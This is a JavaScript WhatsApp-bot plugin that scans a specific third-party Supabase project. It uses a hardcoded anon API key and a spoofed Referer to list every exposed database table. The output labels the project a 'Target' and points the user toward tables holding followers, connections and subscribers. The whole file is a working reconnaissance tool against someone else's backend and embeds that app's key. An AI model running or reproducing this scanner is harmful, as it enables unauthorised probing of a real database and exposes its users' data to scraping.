import axios from 'axios';

const CONFIG = {
    API_URL: "https://vnuturzxvxkjbkawgnpf.supabase.co",
    API_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZudXR1cnp4dnhramJrYXdnbnBmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTcxMzQsImV4cCI6MjA4NDU5MzEzNH0.v1pLqnN0VuYAeCSqKU3KEbGxam-hIc0md31WPhEiImQ",
    REFERER: "https://denki-toolweb.lovable.app/"
};

const handler = async (m, { conn }) => {
    await m.react('🔍');
    const { key } = await conn.sendMessage(m.chat, { text: `🖥️ _Scanning Database Schema for hidden tables..._` }, { quoted: m });

    try {
        // This specific endpoint (PostgREST OpenAPI) reveals all accessible tables
        const response = await axios.get(`${CONFIG.API_URL}/rest/v1/`, {
            headers: {
                "apikey": CONFIG.API_KEY,
                "Referer": CONFIG.REFERER
            }
        });

        // The definitions object contains all table names
        const tables = Object.keys(response.data.definitions || {});

        if (tables.length === 0) {
            return await conn.sendMessage(m.chat, { text: "❌ Scan Complete: No public tables found.", edit: key });
        }

        let report = `📂 *DATABASE TABLE DIRECTORY* ✅\n`;
        report += `Found ${tables.length} tables in this project:\n`;
        report += `──────────────────\n\n`;

        tables.forEach((table, i) => {
            report += `*${i + 1}.* \`${table}\`\n`;
        });

        report += `\n──────────────────\n_Look for names like 'user_followers', 'connections', or 'subscribers'._`;

        await conn.sendMessage(m.chat, { 
            text: report,
            edit: key,
            contextInfo: {
                externalAdReply: {
                    title: `OMEGATECH SCHEMA SCANNER`,
                    body: `Target: vnuturzxvxkjbkawgnpf`,
                    showAdAttribution: true
                }
            }
        });

    } catch (e) {
        await conn.sendMessage(m.chat, { text: `❌ *Scan Failed:* ${e.message}`, edit: key });
    }
};

handler.help = ['scantables'];
handler.tags = ['owner'];
handler.command = /^(scantables|listtables|showdb)$/i;

export default handler;